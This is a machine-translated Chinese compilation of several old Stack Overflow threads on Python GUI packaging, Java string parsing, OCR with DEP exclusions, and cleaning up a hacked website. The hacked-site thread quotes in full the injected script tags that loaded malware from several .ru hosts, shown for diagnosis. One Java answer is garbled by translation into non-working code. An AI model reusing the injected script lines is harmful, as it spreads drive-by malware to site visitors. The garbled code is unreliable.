这些`META-INF.services`东西以其 API 中的类名而闻名：[ServiceLoader](http://java.sun.com/javase/6/docs/api/java/util/ServiceLoader.html)。谷歌搜索[ServiceLoader 会](http://www.google.ca/search?hl=en&q=ServiceLoader)产生一些信息。

我对它不是很熟悉，但有时这一切都与了解正确的搜索关键字有关。

# python - 使用 Python 创建可直接执行的跨平台 GUI 应用程序

> ID：2933
> 
> 赞同：298
> 
> 时间：2008-08-05T22:26:00.797
> 
> 标签：python, user-interface, deployment, tkinter, release-management

Python 可以在多个平台上工作，并且可以用于桌面和 Web 应用程序，因此我得出结论，有一些方法可以将它编译成 Mac、Windows 和 Linux 的可执行文件。

问题是我不知道从哪里开始或如何用它编写 GUI，任何人都可以对此有所了解并指出正确的方向吗？

* * *

## 回答 #1

> 赞同：303
> 
> 时间：2008-08-05T22:34:25.397

首先，您将需要一些带有 Python 绑定的 GUI 库，然后（如果需要）一些将您的 Python 脚本转换为独立可执行文件的程序。

**具有 Python 绑定的跨平台 GUI 库（Windows、Linux、Mac）**

当然，有很多，但我在野外看到的最受欢迎的是：

*   [Tkinter](http://wiki.python.org/moin/TkInter) - 基于[Tk GUI 工具包](http://www.tcl.tk/)（python 的事实上的标准 GUI 库，商业项目免费）
*   [WxPython](http://www.wxpython.org/) - 基于[WxWidgets](http://www.wxwidgets.org/)（流行，商业项目免费）
*   [Qt](https://www.qt.io)使用[PyQt 绑定](https://riverbankcomputing.com/software/pyqt/intro)或[Qt for Python](https://www.qt.io/qt-for-python)。前者对于商业项目不是免费的。后者不太成熟，但可以免费使用。

完整列表位于[http://wiki.python.org/moin/GuiProgramming](http://wiki.python.org/moin/GuiProgramming)

**单个可执行文件（所有平台）**

*   [PyInstaller](https://www.pyinstaller.org/) - 最活跃的（也可以与 一起使用`PyQt`）
*   [fbs](https://build-system.fman.io) - 如果您在上面选择 Qt

**单个可执行文件 (Windows)**

*   [py2exe](http://www.py2exe.org/) - 曾经是最流行的

**单个可执行文件 (Linux)**

*   [Freeze](http://wiki.python.org/moin/Freeze) - 工作方式与 py2exe 相同，但针对 Linux 平台

**单个可执行文件 (Mac)**

*   [py2app](https://pythonhosted.org/py2app/) - 同样，像 py2exe 一样工作，但针对 Mac OS

* * *

## 回答 #2

> 赞同：60
> 
> 时间：2008-08-28T08:41:45.853

另一个系统（尚未在已接受的答案中提及）是 PyInstaller，它适用于我的 PyQt 项目，而 py2exe 却不能。我发现它更容易使用。

[http://www.pyinstaller.org/](http://www.pyinstaller.org/)

Pyinstaller 基于 Gordon McMillan 的 Python 安装程序。哪个不再可用。

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2008-08-15T11:56:02.663

py2exe 的替代工具是[bbfreeze](http://pypi.python.org/pypi/bbfreeze/)，它为 windows 和 linux 生成可执行文件。它比 py2exe 更新，并且可以很好地处理鸡蛋。我发现它神奇地工作得更好，无需为各种应用程序进行配置。

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2008-11-05T15:53:19.173

还有[PyGTK](http://pygtk.org/)，它基本上是 Gnome Toolkit 的 Python 包装器。我发现它比 Tkinter 更容易让我思考，因为以前几乎没有 GUI 编程知识。它工作得很好，并且有一些很好的教程。不幸的是，目前还没有适用于 Windows 的 Python 2.6 安装程序，而且可能暂时还没有。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2008-08-06T00:29:36.897

由于现在几乎所有非 Windows 操作系统都默认安装了 python，因此您真正需要确保的唯一一件事是安装了您使用的所有非标准库。

话虽如此，可以构建包含 python 解释器和您使用的任何库的可执行文件。但是，这可能会创建一个大型可执行文件。

MacOS X 甚至在 Xcode IDE 中支持创建完整的独立 GUI 应用程序。这些可以由任何运行 OS X 的用户运行。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2008-08-19T09:45:44.420

对于 GUI 本身：

[PyQT](http://wiki.python.org/moin/PyQt)几乎是参考。

开发快速用户界面的另一种方法是编写一个 Web 应用程序，让它在本地运行并在浏览器中显示该应用程序。

另外，如果您选择 lubos hasko 建议的 Tkinter 选项，您可能想尝试使用portablepy 让您的应用程序在没有Python 的Windows 环境中运行。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2008-08-15T12:00:37.193

我不确定这是不是最好的方法，但是当我在 Windows 上部署 Ruby GUI 应用程序（不是 Python，但就 .exe 而言具有相同的“问题”）时，我只写了一个调用我的主脚本的 C# 中的简短启动器。它编译为可执行文件，然后我有一个应用程序可执行文件。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2018-10-09T12:30:07.693

PySimpleGUI 包装了 tkinter，适用于 Python 3 和 2.7。它还可以在 Qt、WxPython 和 Web 浏览器上运行，对所有平台使用相同的源代码。

您可以制作自定义 GUI，使用您在 tkinter 中找到的所有相同小部件（滑块、复选框、单选按钮......）。代码往往非常紧凑和可读。

```
#!/usr/bin/env python
import sys
if sys.version_info[0] >= 3:
    import PySimpleGUI as sg
else:
    import PySimpleGUI27 as sg

layout = [[ sg.Text('My Window') ],
          [ sg.Button('OK')]]

window = sg.Window('My window').Layout(layout)
button, value = window.Read() 
```

[![从发布的 PySimpleGUI 代码创建的图像](../Images/220f282b596c7ff6e3057652a7a1073d.png)](https://i.stack.imgur.com/VCegl.jpg)

如[PySimpleGUI 文档](http://www.PySimpleGUI.org)中所述，要构建您运行[的 .EXE 文件：](https://pysimplegui.readthedocs.io/#creating-a-windows-exe-file)

> pyinstaller -wF MyGUIProgram.py

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2017-01-31T19:51:42.963

```
# I'd use tkinter for python 3

import tkinter

tk = tkinter.Tk()
tk.geometry("400x300+500+300")
l = Label(tk,text="")
l.pack()
e = Entry(tk)
e.pack()

def click():
    e['text'] = 'You clicked the button'

b = Button(tk,text="Click me",command=click)
b.pack()

tk.mainloop()

# After this I would you py2exe
# search for the use of this module on stakoverflow
# otherwise I could edit this to let you know how to do it 
```

# py2exe

然后你应该使用py2exe，例如，将运行应用程序所需的所有文件放入一个文件夹，即使用户在他的电脑上没有python（我说的是windows......对于苹果操作系统来说没有必要我认为是一个可执行文件，因为它带有 python，不需要安装它。

# 创建这个文件

1.  创建一个 setup.py

* * *

使用此代码：

```
from distutils.core import setup
import py2exe

setup(console=['l4h.py']) 
```

## 将其保存在文件夹中

2.  将您的程序放在 setup.py 的同一文件夹中

## ps：更改文件名（从l4h到你想要的任何东西，这是一个例子）

3.  从该文件夹运行 cmd（在该文件夹上，右键单击 + shift 并选择在此处启动 cmd）
4.  写在 cmd:>python setup.py py2exe
5.  在 dist 文件夹中有你需要的所有文件
6.  你可以压缩它并分发它

## 安装程序

### 从 cmd 安装

**

> 点安装 pyinstaller

**

### 从文件所在文件夹的 cmd 运行它

**

> pyinstaller 文件.py

**

# 更新

阅读这篇文章，以正确的方式使用 pyinstaller 在 Windows 上制作一个 exe，并在其中包含一个文件和图像[https://pythonprogramming.altervista.org/auto-py-to-exe-only-one-file-with-images-为我们的 python 应用程序/](https://pythonprogramming.altervista.org/auto-py-to-exe-only-one-file-with-images-for-our-python-apps/)

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2020-01-10T07:24:51.160

> **！！！基维！！！**

看到没有人提到基维，我很惊讶！！！

我曾经用 Tkinter 做过一个项目，虽然他们确实主张它改进了很多，但它仍然给我一种 windows 98 的感觉，所以我切换到了[Kivy](https://kivy.org/#home)。

如果有帮助，我一直在关注一个[教程系列](https://www.youtube.com/playlist?list=PLzMcBGfZo4-kSJVMyYeOQ8CXJ3z1k7gHn)...

只是为了了解 kivy 的外观，请参阅此（我正在从事的项目）：

[![我正在做的项目](../Images/635d1f12059b38181e5facbab7d51dd6.png)](https://i.stack.imgur.com/IMl67.png)

而且我已经工作了不到一周！你问 Kivy 的好处？检查[这个](https://www.reddit.com/r/kivy/comments/4omhca/what_exactly_are_the_benefits_of_kivy/)

我选择它的原因是它的外观以及它也可以在移动设备中使用。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-08-05T22:40:17.473

你不需要为 Mac/Windows/Linux*编译python。*它是一种解释型语言，因此您只需在您选择的系统上安装 Python 解释器（它适用于所有三个平台）。

至于跨平台工作的GUI库，Python的[Tk/Tcl](http://www.tcl.tk/)小部件库工作得很好，我相信是足够跨平台的。

[Tkinter](http://docs.python.org/lib/module-Tkinter.html)是 Tk/Tcl 的 python 接口

从 python 项目网页：

> Tkinter 不是 Python 的唯一 GuiProgramming 工具包。然而，它是最常用的一种，几乎是唯一一种可在 Unix、Mac 和 Windows 之间移植的

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2017-06-08T10:21:11.723

您可以`appJar`用于基本的 GUI 开发。

```
from appJar import gui

num=1

def myfcn(btnName):   
    global num
    num +=1
    win.setLabel("mylabel", num)

win = gui('Test')

win.addButtons(["Set"],  [myfcn])
win.addLabel("mylabel", "Press the Button")

win.go() 
```

[![运行时的图形界面](../Images/fdb878257b65f025d3f27880b2f8679f.png)](https://i.stack.imgur.com/yin42.jpg)

请参阅[appJar 站点上](http://appjar.info)的文档。

安装是`pip install appjar`从命令行进行的。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2021-04-10T13:56:11.187

你可以做三件事：

首先是找到一个可以将其代码作为独立应用程序（如 .exe 文件）启动的 GUI 设计器。我使用 MatDeck 的一个版本（对于使用 GUI 设计器的人，我推荐[MD Python Designer](https://labdeck.com/python-designer/)），因为我相信（我使用另一个版本，所以我不太确定。）它允许我将代码转换为独立的应用程序并拥有它因此，无需在要运行该程序的每台 PC 上安装该软件。

第二个选项是部分绕过问题，将 GUI 作为网页启动。如果不是所有操作系统都可以使用它，这将为您提供最大的兼容性。再一次，您需要一个可以将其组件转换为 Web 兼容格式的 GUI 设计器，我已经做过一次并且我使用了相同版本的 MatDeck（[Visionary Deck](https://labdeck.com/visionary-deck/)），我这次不推荐 MD Python Designer，因为我不知道它是否可以使用 Web 汇编将其 GUI 转换为网站，而我已经尝试和测试过 Visionary Deck。与所有事情一样，很可能还有其他软件，这只是我经常使用的一个，因为我经常研究数学和物理。

第三个选项也是绕过问题，但在 Tkinter 中执行，只需确保您有 Python IDE 或只是普通的旧 Python 并运行代码，这将启动 GUI。这是一个很好的解决方案，也许是最简单的，但我不会将其归类为最短或最好的。如果您只打算在几个操作系统和计算机之间切换，这可能是您最好的选择。

# ocr - 如何让索引服务和 MODI 通过 OCR 生成全文？

> ID：2959
> 
> 赞同：75
> 
> 时间：2008-08-05T23:16:30.163
> 
> 标签：ocr, modi, indexing-service

我已配置索引服务来索引我的文件，其中还包括保存为高分辨率[TIFF](https://en.wikipedia.org/wiki/TIFF)文件的扫描图像。我还安装了 MS Office 2003+ 并正确配置了 MS Office Document Imaging (MODI)，因此我可以对我的图像执行[OCR](https://en.wikipedia.org/wiki/Optical_character_recognition)，甚至可以将[OCR](https://en.wikipedia.org/wiki/Optical_character_recognition)的文本嵌入到 TIFF 中。

索引服务能够索引和查找那些手动 OCR 并使用文本数据重新保存的[TIFF -s（使用 MS Document Imaging 工具）。](https://en.wikipedia.org/wiki/TIFF)

事实证明，与 Windows XP SP2 一起部署的数据执行保护 (DEP) 认为 MODI 是恶意的，并拒绝让它发挥作用。我已经能够通过完全关闭 DEP 来让它工作，但我发现这个解决方案并不优雅。

在不禁用 DEP 的情况下，是否有更好的解决方案来完成这项工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2018-09-07T09:38:28.240

为特定应用程序禁用 DEP。

如何为特定应用程序禁用 DEP

1.  单击 Windows 计算机上的开始按钮，然后选择计算机 > 系统属性 > 高级系统设置。
2.  从“系统属性”对话框中，选择“设置”。
3.  选择数据执行保护选项卡。
4.  选择为除我选择的程序和服务之外的所有程序和服务启用 DEP。

单击添加并使用浏览功能浏览到要排除的程序可执行文件，例如 excel.exe 或 word.exe。

根据您的 Windows 版本，您可能需要通过在 Windows 资源管理器中右键单击此 PC 或计算机来访问系统属性对话框。

1.  在 Windows 资源管理器中，右键单击并选择属性 > 高级系统设置 > 系统属性。
2.  选择高级 > 性能 > 数据执行保护。
3.  选择为除我选择的程序和服务之外的所有程序和服务启用 DEP。
4.  单击添加并使用浏览功能浏览到要排除的程序可执行文件。

排除：

```
C:\Program Files\Common Files\Microsoft Shared\MODI\11.0\MSPOCRDC.EXE  
C:\Program Files\Common Files\Microsoft Shared\MODI\11.0\MSPSCAN.EXE  
C:\Program Files\Common Files\Microsoft Shared\MODI\11.0\MSPVIEW.EXE 
```

* * *

不属于答案的附加信息：

要在最新版本的 Windows 上获取并安装 MODI，请参阅：
“ [Microsoft Office Document Imaging – Office 2010 到 Office 2016](http://www.myloginvault.co.uk/microsoft-office-document-imaging/) ”

参考：

“[从 DEP（数据执行保护）中排除程序](https://www.lifewire.com/exclude-programs-from-dep-data-153349)”

“ [Microsoft Office 文档扫描错误](https://groups.google.com/forum/#!topic/microsoft.public.office/M8wclmNL_SE)”

MODI 是（免费）“ [Microsoft SharePoint Designer 2007](https://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=21581) ”的一部分。

# java - 在 Java 中解析字符串有哪些不同的方法？

> ID：2968
> 
> 赞同：53
> 
> 时间：2008-08-05T23:49:53.560
> 
> 标签：java, string, parsing

对于解析播放器命令，我最常使用[split](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#split%28java.lang.String%29)方法通过分隔符拆分字符串，然后通过一系列`if`s 或`switch`es 找出其余部分。在 Java 中解析字符串有哪些不同的方法？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2008-08-05T23:54:05.533

我真的很喜欢正则表达式。只要命令字符串相当简单，您就可以编写一些正则表达式，这些正则表达式可能需要几页代码来手动解析。

我建议您查看[http://www.regular-expressions.info](http://www.regular-expressions.info)以获得对正则表达式的良好介绍，以及 Java 的具体示例。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2008-08-06T00:42:00.817

我假设您正在尝试使命令界面尽可能宽容。如果是这种情况，我建议您使用类似于此的算法：

1.  读入字符串
    *   将字符串拆分为标记
    *   使用字典将同义词转换为通用形式
    *   例如，将“hit”、“punch”、“strike”和“kick”全部转换为“hit”
    *   在无序、包容的基础上执行操作
    *   **无序**——“打猴子的脸”和“打猴子的脸”是一回事
    *   **包容性**- 如果命令应该是“打猴子的脸”并且他们提供“打猴子”，你应该检查有多少命令匹配。如果只有一个命令，请执行此操作。拥有命令优先级甚至可能是一个好主意，即使有匹配项，它也会执行最高操作。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2008-08-30T22:26:00.180

手动解析很有趣……一开始:)

实际上，如果命令不是很复杂，您可以像在命令行解释器中使用的那样对待它们。您可以使用一个库列表：http: [//java-source.net/open-source/command-line](http://java-source.net/open-source/command-line)。我认为您可以从[apache commons CLI](http://commons.apache.org/cli)或[args4j](http://args4j.kohsuke.org/)（使用注释）开始。它们有据可查，使用起来非常简单。它们会自动处理解析，您唯一需要做的就是读取对象中的特定字段。

如果您有更复杂的命令，那么创建正式语法可能是一个更好的主意。有一个非常好的库，带有图形编辑器、调试器和语法解释器。它被称为[ANTLR](http://www.antlr.org/)（和编辑器[ANTLRWorks](http://www.antlr.org/works/index.html)），它是免费的：）还有一些示例语法和教程。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-08-06T00:16:25.020

我会看一下[Zork的](http://en.wikipedia.org/wiki/Zork)[Java 迁移](http://www.google.com/search?q=Zork+in+Java)，并倾向于一个简单的[自然语言处理器](http://en.wikipedia.org/wiki/Natural_language_processing)（由标记化或正则表达式驱动），如下所示（来自此链接）：

```
    公共静态布尔simpleNLP（字符串输入行，字符串关键字[]）
    {
        诠释我;
        int maxToken = 关键字.长度；
        到，从；
        如果（输入线长度（）=输入线长度（））返回假；// 检查空行和空行
        而（到 >=0 ）
        {
            to = inputline.indexOf(' ',from);
            如果（到 > 0）{
                lexed.addElement(inputline.substring(from,to));
                从=到；
                而（inputline.charAt（来自）==''
                && from =keywords.length) { status = true; 休息;}
            }
        }
        返回状态；
    }

```

...

在我的书中，任何让程序员有理由再次关注 Zork 的东西都很好，只要注意 Grues。

...

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2008-08-06T16:14:45.460

Sun 本身建议远离 StringTokenizer 并改用 String.spilt 方法。

您还需要查看 Pattern 类。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2008-08-31T01:38:29.890

再次投票给 ANTLR/ANTLRWorks。如果您创建文件的两个版本，一个带有用于实际执行命令的 Java 代码，另一个没有（仅带有语法），那么您就有了该语言的可执行规范，这对于测试非常有用，对文档来说是一个福音，如果您决定移植它，可以节省大量时间。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2008-08-31T01:05:38.457

如果这是为了解析命令行，我建议使用[Commons Cli](http://commons.apache.org/cli/)。

> Apache Commons CLI 库提供了一个用于处理命令行界面的 API。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2008-08-31T19:45:45.020

试试[JavaCC](https://java.net/projects/javacc)一个 Java 解析器生成器。

它有很多解释语言的特性，并且在 Eclipse 上得到很好的支持。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2008-08-06T15:18:18.957

@CodingTheWheel 继承你的代码，稍微清理一下并通过 eclipse ( `ctrl`++ `shift`)`f`并插入到这里:)

包括每行前面的四个空格。

```
public static boolean simpleNLP(String inputline, String keywords[]) {
    if (inputline.length() < 1)
        return false;

    List<String> lexed = new ArrayList<String>(); 
    for (String ele : inputline.split(" ")) {
        lexed.add(ele);
    }

    boolean status = false;
    to = 0;
    for (i = 0; i < lexed.size(); i++) {
        String s = (String) lexed.get(i);
        if (s.equalsIgnoreCase(keywords[to])) {
            to++;
            if (to >= keywords.length) {
                status = true;
                break;
            }
        }
    }
    return status;
} 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-08-05T23:57:02.577

一个简单的空格字符串分词器应该可以工作，但实际上有很多方法可以做到这一点。

下面是一个使用分词器的例子：

```
String command = "kick person";
StringTokenizer tokens = new StringTokenizer(command);
String action = null;

if (tokens.hasMoreTokens()) {
    action = tokens.nextToken();
}

if (action != null) {
    doCommand(action, tokens);
} 
```

然后令牌可以进一步用于参数。这一切都假设参数中没有使用空格......所以你可能想要滚动你自己的简单解析机制（比如获取第一个空格并使用之前的文本作为操作，或者如果你不介意使用正则表达式速度命中），只需将其抽象出来，以便可以在任何地方使用。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-08-06T15:40:46.917

当命令的分隔符字符串总是相同的字符串或字符（如“;”）时，建议您使用 StrinkTokenizer 类：

[字符串标记器](http://java.sun.com/javase/6/docs/api/java/util/StringTokenizer.html)

但是当分隔符变化或复杂时，建议您使用正则表达式，String 类本身可以使用它，方法 split，从 1.4 开始。它使用 java.util.regex 包中的 Pattern 类

[图案](http://java.sun.com/javase/6/docs/api/java/util/regex/Pattern.html)

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-09-16T15:35:53.000

如果语言很简单，就像

动词名词

然后用手拆分效果很好。

如果它更复杂，您应该真正研究像 ANTLR 或 JavaCC 这样的工具。

我在[http://javadude.com/articles/antlrtut](http://javadude.com/articles/antlrtut)有一个关于 ANTLR (v2) 的教程，它将让您了解它是如何工作的。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2010-08-20T13:59:05.463

[JCommander](http://beust.com/jcommander/)看起来相当不错，虽然我还没有测试它。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2012-11-24T09:17:03.450

如果您的文本包含一些分隔符，那么您可以使用您的`split`方法。
如果文本包含不规则字符串意味着其中的格式不同，那么您必须使用`regular expressions`.

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2014-05-13T14:13:15.043

split 方法可以将字符串拆分成指定子字符串表达式的数组`regex`。它的参数有两种形式，分别是：split( `String regex`)和split( `String regex, int limit`)，其中split( `String regex`)实际上是通过调用split(String regex, int limit)来实现的，*limit是0*。那么，当*limit>0*和*limit<0*分别代表什么？

**jdk**时解释：当limit *>0*时子数组的长度达到limit，即如果可能的话，可以将*limit-1*细分，剩余为一个子串（除了被limit-1次的字符有字符串拆分结束） ;

*limit <0*表示对数组的长度没有限制；

*limit = 0*字符串结尾的空字符串将被截断。 `StringTokenizer`class 是出于兼容性原因，保留了遗留类，所以我们应该尝试使用 String 类的 split 方法。参考[链接](http://codingkit.com/java/9529.html)

# security - 我的网站被黑了。我该怎么办？

> ID：2970
> 
> 赞同：23
> 
> 时间：2008-08-05T23:55:25.700
> 
> 标签：security, cracking

我爸爸今天打电话给我，说访问他的网站的人正在尝试将 168 种病毒下载到他们的计算机上。他根本不是技术人员，而是用所见即所得的编辑器构建了整个东西。

我打开了他的网站并查看了源代码，在源代码底部的结束 HTML 标记之前有一行 Javascript 包含。他们包括这个文件（以及许多其他文件）：[http](http://www.98hs.ru/js.js) ://www.98hs.ru/js.js <--**在你去那个 URL 之前关闭 JAVASCRIPT。**

所以我暂时把它注释掉了。事实证明，他的 FTP 密码是一个普通的字典单词，长度为六个字母，所以我们认为这就是它被黑客入侵的原因。我们已将他的密码更改为一个 8 位以上的非单词字符串（他不会输入密码，因为他是个打猎打字员）。

我[在 98hs.ru 上做了一个 whois](http://whois.domaintools.com/98hs.ru)，发现它是由智利的服务器托管的。实际上也有一个与之相关的电子邮件地址，但我严重怀疑这个人是罪魁祸首。可能只是其他一些被黑客入侵的网站......

我现在不知道该怎么做，因为我以前从未处理过这种事情。有人有什么建议吗？

他通过 webhost4life.com 使用普通的 jane 不安全 ftp。我什至看不到在他们的网站上*进行*sftp 的方法。我在想他的用户名和密码被截获了？

**因此，为了使这与社区更相关，您应该采取哪些步骤/应该遵循哪些最佳实践来保护您的网站免受黑客攻击？**

为了记录，这是“神奇地”添加到他的文件中的代码行（并且不在他计算机上的文件中——我将其注释掉只是为了绝对确保它不会做任何事情在这个页面上，虽然我确信杰夫会提防这一点）：

```
<!--script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script--> 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-08-06T00:16:07.797

尝试收集尽可能多的信息。看看主机是否可以给你一个日志，显示对你的帐户进行的所有 FTP 连接。您可以使用它们来查看是否是用于进行更改的 FTP 连接并可能获取 IP 地址。

如果您使用的是预先打包的软件，例如 Wordpress、Drupal 或其他任何您未编码的软件，则上传代码中可能存在允许此类修改的漏洞。如果它是定制的，请仔细检查您允许用户上传文件或修改现有文件的任何地方。

第二件事是按原样转储网站并检查所有内容以进行其他修改。这可能只是他们所做的一项修改，但如果他们通过 FTP 进入，谁知道那里还有什么。

将您的站点恢复到已知的良好状态，如果需要，升级到最新版本。

您还必须考虑一定程度的回报。是否值得尝试追踪此人，或者这是否是您生活、学习和使用更强密码的地方？

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2008-08-07T22:49:55.830

我知道这在游戏中有点晚了，但是提到的 JavaScript 的 URL 在已知是 6 月开始的 ASPRox 机器人复兴的一部分的网站列表中提到（至少那是我们被标记的时候）它）。下面提到了一些关于它的细节：

[http://www.bloombit.com/Articles/2008/05/ASCII-Encoded-Binary-String-Automated-SQL-Injection.aspx](http://www.bloombit.com/Articles/2008/05/ASCII-Encoded-Binary-String-Automated-SQL-Injection.aspx)

令人讨厌的是，实际上数据库中的每个 varchar 类型字段都被“感染”以吐出对该 URL 的引用，浏览器在其中得到一个很小的 ​​iframe，将其变成机器人。可以在这里找到一个基本的 SQL 修复：

[http://aspadvice.com/blogs/programming_shorts/archive/2008/06/27/Asprox-Recovery.aspx](http://aspadvice.com/blogs/programming_shorts/archive/2008/06/27/Asprox-Recovery.aspx)

可怕的是，病毒会从系统表中寻找要感染的值，并且许多共享托管计划还为其客户共享数据库空间。因此，很可能甚至不是您父亲的站点被感染，而是他托管集群中的其他人的站点编写了一些糟糕的代码并为 SQL 注入攻击打开了大门。

如果他还没有这样做，我会向他们的主机发送一封紧急电子邮件，并给他们一个指向该 SQL 代码的链接以修复整个系统。您可以修复自己受影响的数据库表，但最有可能进行感染的机器人将再次穿过该漏洞并感染整个数据库。

希望这可以为您提供更多信息。

编辑：再想一想，如果他使用其中一个主机在线设计工具来构建他的网站，那么所有这些内容可能都放在一个列中并以这种方式被感染。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-08-06T03:31:22.940

您提到您的父亲正在使用网站发布工具。

如果发布工具从他的电脑发布到服务器，可能是他的本地文件是干净的，他只需要重新发布到服务器。

他应该看看他的服务器是否有与普通 FTP 不同的登录方法，不过……这不是很安全，因为它通过 Internet 以明文形式发送他的密码。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-08-06T00:00:22.180

使用六个字字符的密码，他可能是被蛮力强迫的。这比他的 ftp 被拦截的可能性更大，但也可能是这样。

从更强的密码开始。（8个字还是比较弱的）

看看这个指向互联网[安全博客](http://blog.modsecurity.org/2008/01/is-your-website.html)的链接是否有帮助。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-08-06T00:24:23.927

该网站只是普通的静态 HTML 吗？即，他没有设法为自己编写一个上传页面，允许任何人开车经过上传受感染的脚本/页面？

为什么不询问 webhost4life 是否有可用的 FTP 日志并向他们报告问题。你永远不知道，他们可能很容易接受并为你找出到底发生了什么？

我为共享主机工作，我们总是欢迎这样的报告，通常可以查明基于攻击的确切向量，并建议客户出错的地方。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-26T20:12:13.310

拔下网络服务器而不将其关闭以避免关闭脚本。通过另一台计算机作为数据驱动器分析硬盘，看看您是否可以通过日志文件和那种性质的东西确定罪魁祸首。验证代码是否安全，然后从备份中恢复。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-26T20:21:14.443

This happened to a client of mine recently that was hosted on ipower. I'm not sure if your hosting environment was Apache based, but if it was be sure to double check for .htaccess files that you did not create, particularly above the webroot and inside of image directories, as they tend to inject some nastiness there as well (they were redirecting people depending on where they came from in the refer). Also check any that you did create for code that you did not write.

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2008-08-16T16:35:18.043

我们显然是被同一个人黑了！或者机器人，在我们的例子中。他们在一些没有人维护的旧经典 ASP 站点的 URL 中使用 SQL 注入。我们发现了攻击 IP 并在 IIS 中阻止了它们。现在我们必须重构所有旧的 ASP。因此，我的建议是先查看 IIS 日志，以确定问题是否出在您网站的代码或服务器配置中。

# c# - 使用 Win32 API 在 C# 中将窗口置于最前面

> ID：2987
> 
> 赞同：46
> 
> 时间：2008-08-06T00:55:48.277
> 
> 标签：c#, winapi

我正在编写一个应用程序，该应用程序需要将外部应用程序的窗口置于前台，而不必窃取焦点（用户可以切换为窃取/不窃取焦点的设置）。

